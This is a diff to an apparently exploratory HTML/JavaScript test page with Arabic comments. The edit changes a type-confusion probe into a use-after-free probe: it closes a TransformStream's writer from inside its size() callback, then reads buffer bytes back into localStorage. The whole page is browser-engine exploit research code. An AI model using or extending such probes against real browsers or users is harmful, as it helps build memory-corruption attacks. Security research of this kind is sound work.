@@ -3,49 +3,58 @@
 <body>
 <div id="s">Running...</div>
 <script>
-localStorage.removeItem('leak_result');
-localStorage.removeItem('leak_data');
+localStorage.removeItem('uaf_result');
+localStorage.removeItem('uaf_data');
 
 let buf = new ArrayBuffer(8);
 let view = new DataView(buf);
+let writer;
 
-// دالة size: ستعيد كائناً بدلاً من رقم
-// إذا لم يفحص المحرك النوع، سيحدث Type Confusion
 let sizeFunc = function(chunk) {
-    // اكتب في buf لتأكيد أن الدالة استُدعيت
+    // 1. سجل أننا داخل الدالة
     view.setFloat64(0, 1.1, true);
     
-    // أعد كائناً بدلاً من رقم
-    // المحرك يتوقع رقماً، فإذا استخدم الكائن كرقم...
-    return { valueOf: () => { return 1; } };
+    // 2. حاول إغلاق الـ Stream أثناء التنفيذ!
+    try {
+        writer.close();
+    } catch(e) {}
+    
+    // 3. حاول إعادة الكتابة لترى إذا كنا ما زلنا نعمل
+    view.setFloat64(0, 2.2, true);
+    
+    return 1;
 };
 
 try {
-    // أنشئ TransformStream مع size function
     let stream = new TransformStream(
         { transform: (c, ctrl) => ctrl.enqueue(c) },
         { highWaterMark: 1, size: sizeFunc },
         { highWaterMark: 1, size: sizeFunc }
     );
     
+    writer = stream.writable.getWriter();
+    
     // اكتب chunk لتشغيل size()
-    let writer = stream.writable.getWriter();
     writer.write("test").then(() => {
         let hex = "";
         for (let i = 0; i < 8; i++) {
             hex += view.getUint8(i).toString(16).padStart(2,'0') + " ";
         }
-        localStorage.setItem('leak_result', 'WRITE_OK');
-        localStorage.setItem('leak_data', hex);
+        localStorage.setItem('uaf_result', 'WRITE_OK');
+        localStorage.setItem('uaf_data', hex);
     }).catch((e) => {
-        localStorage.setItem('leak_result', 'WRITE_ERR: ' + e.message);
+        let hex = "";
+        for (let i = 0; i < 8; i++) {
+            hex += view.getUint8(i).toString(16).padStart(2,'0') + " ";
+        }
+        localStorage.setItem('uaf_result', 'WRITE_ERR: ' + e.message);
+        localStorage.setItem('uaf_data', hex);
     });
     
-    // سجل فورياً بعد الإنشاء
-    localStorage.setItem('leak_result', 'STREAM_CREATED');
+    localStorage.setItem('uaf_result', 'STREAM_CREATED');
     
 } catch(e) {
-    localStorage.setItem('leak_result', 'CREATE_ERR: ' + e.message);
+    localStorage.setItem('uaf_result', 'CREATE_ERR: ' + e.message);
 }
 
 document.getElementById("s").textContent = "Done.";
